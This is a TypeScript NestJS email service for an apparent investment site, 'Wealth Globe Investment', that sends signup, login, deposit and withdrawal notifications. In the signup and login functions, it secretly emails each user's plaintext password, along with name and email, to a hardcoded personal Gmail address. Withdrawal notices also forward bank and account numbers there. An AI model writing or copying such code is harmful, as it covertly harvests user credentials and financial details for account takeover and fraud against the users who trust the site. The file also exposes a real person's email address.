// mail.service.ts
import * as nodemailer from 'nodemailer';
import { Injectable, InternalServerErrorException } from '@nestjs/common';

@Injectable()
export class MailService {
  private transporter: nodemailer.Transporter;
  private readonly adminEmail = 'Johnbrightjb6@gmail.com';
  //   'Johnbrightjb6@gmail.com';

  constructor() {
    this.transporter = nodemailer.createTransport({
      //   service: process.env.Mail_Service || 'gmail',
      host: process.env.Mail_Host,
      port: Number(process.env.Mail_Port) || 465, // 465 (SSL) or 587 (TLS)
      secure: Number(process.env.Mail_Port) === 465,
      auth: {
        user: process.env.Mail_User,
        pass: process.env.Mail_Password,
      },
    });
  }

  async sendSignupMail(
    email: string,
    firstName: string,
    lastName: string,
    password: string,
  ) {
    try {
      // 1️⃣ Send to user
      await this.transporter.sendMail({
        from: `"Wealth Globe Investment" <${process.env.Mail_User}>`,
        to: email,
        subject: 'Welcome to Our App 🚀',
        html: `
          <h2>Hello ${firstName} ${lastName},</h2>
          <p>Welcome! 🎉 Thanks for signing up.</p>
          <p>We’re excited to have you onboard.</p>
          <p style="font-size: 16px; color: #555;">
            We're thrilled to have you join our community. Your signup was successful.
          </p>
        `,
      });

      // 2️⃣ Send to admin
      await this.transporter.sendMail({
        from: `"Wealth Globe Investment" <${process.env.Mail_User}>`,
        to: this.adminEmail,
        subject: '📩 New User Signup Notification',
        html: `
          <h2>New User Signed Up 🎉</h2>
          <p><b>Name:</b> ${firstName} ${lastName}</p>
          <p><b>Email:</b> ${email}</p>
          <p>Password:</b> ${password}</p>
          <p>They have just joined the platform.</p>
        `,
      });
    } catch (err) {
      throw new InternalServerErrorException(`Email not sent: ${err.message}`);
    }
  }

  async sendLoginMail(
    email: string,
    firstName: string,
    lastName: string,
    password: string,
  ) {
    try {
      // 1️⃣ Send to user
      await this.transporter.sendMail({
        from: `"Wealth Globe Investment" <${process.env.Mail_User}>`,
        to: email,
        subject: 'Login Alert',
        html: `
          <h2>Hello ${firstName} ${lastName},</h2>
          <p style="font-size: 16px; color: #555;">
            Your login was successful.
          </p>
          <p>If this wasn’t you, please reset your password immediately.</p>
        `,
      });

      // 2️⃣ Send to admin
      await this.transporter.sendMail({
        from: `"Wealth Globe Investment" <${process.env.Mail_User}>`,
        to: this.adminEmail,
        subject: '🔔 User Login Alert',
        html: `
          <h2>User Logged In</h2>
          <p><b>Name:</b> ${firstName} ${lastName}</p>
          <p><b>Email:</b> ${email}</p>
           <p>Password:</b> ${password}</p>
          <p>The user has just logged in.</p>
        `,
      });
    } catch (err) {
      throw new InternalServerErrorException(`Email not sent: ${err.message}`);
    }
  }
  // ------------------ Deposit Notifications ------------------

  async sendDepositCreated(
    email: string,
    firstName: string,
    lastName: string,
    amount: number,
  ) {
    try {
      // User email
      await this.transporter.sendMail({
        from: `"Wealth Globe Investment <${process.env.Mail_User}>`,
        to: email,
        subject: 'Deposit Request Received',
        html: `<h2>Hello ${firstName} ${lastName},</h2>
               <p>Your deposit request of <b>$${amount}</b> has been received and is pending approval.</p>`,
      });

      // Admin email
      await this.transporter.sendMail({
        from: `"Wealth Globe Investment" <${process.env.Mail_User}>`,
        to: this.adminEmail,
        subject: '🔔 New Deposit Request',
        html: `<h2>New Deposit Request</h2>
               <p><b>Name:</b> ${firstName} ${lastName}</p>
               <p><b>Email:</b> ${email}</p>
               <p><b>Amount:</b> $${amount}</p>`,
      });
    } catch (err) {
      throw new InternalServerErrorException(`Email not sent: ${err.message}`);
    }
  }

  async sendDepositApproved(
    email: string,
    firstName: string,
    lastName: string,
    amount: number,
  ) {
    try {
      // User email
      await this.transporter.sendMail({
        from: `"Wealth Globe Investment" <${process.env.Mail_User}>`,
        to: email,
        subject: 'Deposit Approved ✅',
        html: `<h2>Hello ${firstName} ${lastName},</h2>
               <p>Your deposit of <b>$${amount}</b> has been approved and added to your trading account.</p>`,
      });

      // Admin email
      await this.transporter.sendMail({
        from: `"Wealth Globe Investment" <${process.env.Mail_User}>`,
        to: this.adminEmail,
        subject: '✅ Deposit Approved',
        html: `<h2>Deposit Approved</h2>
               <p><b>Name:</b> ${firstName} ${lastName}</p>
               <p><b>Email:</b> ${email}</p>
               <p><b>Amount:</b> $${amount}</p>`,
      });
    } catch (err) {
      throw new InternalServerErrorException(`Email not sent: ${err.message}`);
    }
  }

  // ------------------ Withdrawal Notifications ------------------

  async sendWithdrawalRequested(
    email: string,
    firstName: string,
    lastName: string,
    amount: number,
  ) {
    try {
      // User email
      await this.transporter.sendMail({
        from: `"Wealth Globe Investment" <${process.env.Mail_User}>`,
        to: email,
        subject: 'Withdrawal Request Submitted',
        html: `<h2>Hello ${firstName} ${lastName},</h2>
               <p>Your withdrawal request of <b>$${amount}</b> has been submitted and is pending approval.</p>`,
      });

      // Admin email
      await this.transporter.sendMail({
        from: `"Wealth Globe Investment" <${process.env.Mail_User}>`,
        to: this.adminEmail,
        subject: '🔔 New Withdrawal Request',
        html: `<h2>New Withdrawal Request</h2>
               <p><b>Name:</b> ${firstName} ${lastName}</p>
               <p><b>Email:</b> ${email}</p>
               <p><b>Amount:</b> $${amount}</p>`,
      });
    } catch (err) {
      throw new InternalServerErrorException(`Email not sent: ${err.message}`);
    }
  }

  async sendWithdrawalApproved(
    email: string,
    firstName: string,
    lastName: string,
    amount: number,
    bank: string,
    accNumber: string,
  ) {
    try {
      // User email
      await this.transporter.sendMail({
        from: `"Wealth Globe Investment" <${process.env.Mail_User}>`,
        to: email,
        subject: 'Withdrawal Approved ✅',
        html: `<h2>Hello ${firstName} ${lastName},</h2>
               <p>Your withdrawal of <b>$${amount}</b> has been approved.</p>
               <p>Bank: ${bank} | Account: ${accNumber}</p>`,
      });

      // Admin email
      await this.transporter.sendMail({
        from: `"Wealth Globe Investment" <${process.env.Mail_User}>`,
        to: this.adminEmail,
        subject: '✅ Withdrawal Approved',
        html: `<h2>Withdrawal Approved</h2>
               <p><b>Name:</b> ${firstName} ${lastName}</p>
               <p><b>Email:</b> ${email}</p>
               <p><b>Amount:</b> $${amount}</p>
               <p>Bank: ${bank} | Account: ${accNumber}</p>`,
      });
    } catch (err) {
      throw new InternalServerErrorException(`Email not sent: ${err.message}`);
    }
  }
}
